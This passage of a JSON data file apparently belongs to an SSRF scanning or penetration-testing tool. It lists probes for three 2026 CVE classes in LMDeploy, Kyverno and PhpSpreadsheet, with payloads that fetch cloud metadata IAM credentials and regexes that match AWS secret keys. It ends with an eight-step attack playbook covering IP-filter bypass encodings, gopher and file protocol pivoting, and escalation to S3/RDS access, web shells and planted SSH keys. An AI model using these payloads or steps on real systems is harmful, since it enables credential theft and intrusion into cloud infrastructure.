    "lmdeploy_vision_url_ssrf_2026": {
      "description": "LMDeploy vision-language model URL fetch SSRF (CVE-2026-33626 class) \u2014 image_url parameter accepts arbitrary URL, server fetches without filtering 169.254.169.254 (AWS IMDS) or http://metadata.google.internal.",
      "tech_match": [
        "LMDeploy"
      ],
      "param_match": [
        "image_url",
        "url",
        "image"
      ],
      "probes": [
        {
          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "description": "AWS IMDSv1 fetch via image_url \u2014 response should contain IAM role names",
          "matchers": [
            {
              "type": "regex",
              "pattern": "(?i)(arn:aws|AccessKeyId|SecretAccessKey)"
            }
          ],
          "severity": "critical",
          "confidence_boost": 70
        }
      ]
    },
    "kyverno_admission_webhook_ssrf_2026": {
      "description": "Kyverno admission-controller RBAC bypass \u2192 SSRF (CVE-2026-4789 class) \u2014 crafted admission policy URL field triggers webhook to fetch attacker URL, reachable cloud metadata.",
      "tech_match": [
        "Kyverno",
        "Kubernetes"
      ],
      "param_match": [
        "url",
        "webhookUrl",
        "imageRegistry"
      ],
      "probes": [
        {
          "payload": "http://169.254.169.254/latest/meta-data/",
          "description": "Force admission webhook to fetch IMDS",
          "matchers": [
            {
              "type": "regex",
              "pattern": "(?i)(iam/security-credentials|hostname:|placement/)"
            }
          ],
          "severity": "high",
          "confidence_boost": 60
        }
      ]
    },
    "phpspreadsheet_xlsx_hyperlink_ssrf_2026": {
      "description": "PhpSpreadsheet IOFactory::load SSRF\u2192RCE (CVE-2026-34084 class) \u2014 uploaded .xlsx with <a:hyperlink target='http://collab'/> causes server-side fetch on parse. Chain with file_upload class.",
      "tech_match": [
        "PhpSpreadsheet",
        "PHP"
      ],
      "param_match": [
        "file",
        "upload",
        "attachment"
      ],
      "probes": [
        {
          "payload": "{{collaborator}}",
          "description": "Upload xlsx with hyperlink target pointing to Collaborator subdomain \u2014 DNS hit confirms SSRF",
          "note": "Requires file-upload + Collaborator. Generate xlsx via openpyxl with cell hyperlink set to {{collaborator}}",
          "matchers": [
            {
              "type": "collaborator"
            }
          ],
          "severity": "critical",
          "confidence_boost": 70
        }
      ]
    }
  },
  "craft_guidance": [
    "1. IDENTIFY ENTRY POINT: URL parameters (url=, redirect=, callback=, webhook=), file imports, PDF generators, image fetchers, API integrations.",
    "2. TEST CONNECTIVITY: Send to Collaborator first. If callback received, SSRF confirmed. If not, try blind via timing (slow internal vs fast external).",
    "3. BYPASS FILTERS: IP blocked? Use decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 ([::1]), DNS rebinding, or redirect from your server.",
    "4. CLOUD METADATA: AWS=169.254.169.254 (IMDSv2 needs token PUT first), GCP=metadata.google.internal, Azure=169.254.169.254 (needs Metadata:true header).",
    "5. PROTOCOL PIVOTING: http:// blocked? Try file:// (local read), gopher:// (Redis/SMTP), dict:// (port scan), ftp://, ldap://.",
    "6. ESCALATION: Metadata creds -> AWS CLI -> S3/RDS access. Redis -> write web shell or SSH key. Elasticsearch -> dump indices. Internal admin panels -> further exploitation.",
    "7. BLIND DETECTION: No response body? Use DNS (Collaborator), timing (internal=slow, external=fast), or error differences (connection refused vs timeout vs success).",
    "8. REDIRECT CHAIN: Target fetches your server -> 302 redirect to internal IP. Bypasses hostname-based filters that only check initial URL."
  ]
}
